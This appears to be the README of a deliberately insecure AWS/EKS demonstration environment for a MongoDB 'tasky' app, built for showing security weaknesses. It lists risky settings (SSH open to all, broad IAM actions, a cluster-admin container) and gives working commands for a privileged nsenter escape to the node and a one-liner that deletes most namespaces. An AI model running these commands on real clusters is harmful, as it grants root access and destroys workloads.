# aws-tasky
This repo will build all required AWS Networking and resources to run a 3 tiered MongoDB app.  This includes EC2, EKS, S3, Route53, and AWS Config.

This environment will address the following security use cases below.
* [configuration](https://github.com/ppresto/aws-consul-pd/blob/main/README_Consul_Failover.md)

## Pre Reqs
- Setup shell with AWS credentials
- AWS Key Pair
- Terraform 1.3.7+
- aws cli
- kubectl
- helm
- curl
- jq

## Getting Started
```
cd quickstart/infra
```
Update the `my.auto.tfvars` for your environment.  Configure your existing AWS Key Pair or copy a local SSH key to your region using this script `./scripts/push-aws-sshkey-multiregion.sh`. Review the prefix being used for resource names, the EKS version, private zone name for route53, and external  CIDR for SSH access. 

### Provision Infrastructure
Use terraform to build the required AWS Infrastructure
```
terraform init
terraform apply -auto-approve
```
All AWS resources have been provisioned and configured to support the tasky application.

### Resource Overview

#### VPC
* AWS VPC TF Module: [terraform-aws-modules/vpc/aws](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf)
#### EC2
  * Route 53 Alias to EC2 IP
  * [IAM Profile](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2_iam_profile/iam-profile.tf#L57) - Actions: "iam:GetRole","ec2:*","s3:GetObject","s3:PutObject","s3:PutObjectAcl","s3:DeleteObject","s3:ListBucket"
  * SG - [EC2](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2/main.tf#L30)
    * Ingress: Allow "0.0.0.0/0" -> TCP 22
    * Egress:  Allow "0.0.0.0/0: -> Any Protocol, Any Port
  * SG - [MongoDB](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2_sg_mongod/main.tf#L12)
    * Ingress: Allow "10.15.0.0/20" -> TCP 27017

#### Route53

#### S3 Bucket

#### MongoDB


#### EKS Cluster
The EKS 1.27 Cluster is running in the private subnet.

#### AWS Loadbalancer controller
The AWS LB controller was installed to support internal NLB or ALBs to EKS services.  This repo is adding the required tags to public and private subnets in order for the LB to properly discover EKS services.  [This repo installed the AWS LB Controller using the following steps](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_eks_cluster_albcontroller/main.tf):
* Create the EKS Cluster Role: load-balancer-controller
* Create the SA: aws-load-balancer-controller
* Install Helm chart: aws-load-balancer-controller

### Connect to EKS clusters
Connect to EKS using `scripts/kubectl_connect_eks.sh`.  Pass this script the path to the terraform state file used to provision the EKS cluster.  If cwd is ./infra like above then this command would look like the following:
```
source ../../scripts/kubectl_connect_eks.sh .
```
This script connects EKS and builds some useful aliases shown in the output.

### Get Ingress URL
```

```

## Tasky Namespace (multitool container)
* why does it have a shell and package manager?
* why does it have cluster-admin privileges?

Install kubectl
```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod 755 kubectl
# Describe rolebinding 
```

Escape into the Node
```
./kubectl run r00t --restart=Never -ti --rm --image tasky --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Delete other namespaces to show you have cluster-admin privileges
```
./kubectl get ns --no-headers=true | sed "/kube-*/d" | sed "/default/d" | sed "/tasky/d" | awk '{print $1;}' | xargs ./kubectl delete ns
```

List rolebindings or clusterroleBindings
```
./kubectl describe rolebinding -A
```

## Next Steps


## References
[OWASP Cheatsheets](https://cheatsheetseries.owasp.org/index.html)
[OWASP Cheatsheets Repo](https://github.com/OWASP/CheatSheetSeries)
[2023 OSS Security Report](https://go.snyk.io/state-of-open-source-security-report-2023-dwn-typ.html)
[HackTricksCloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes)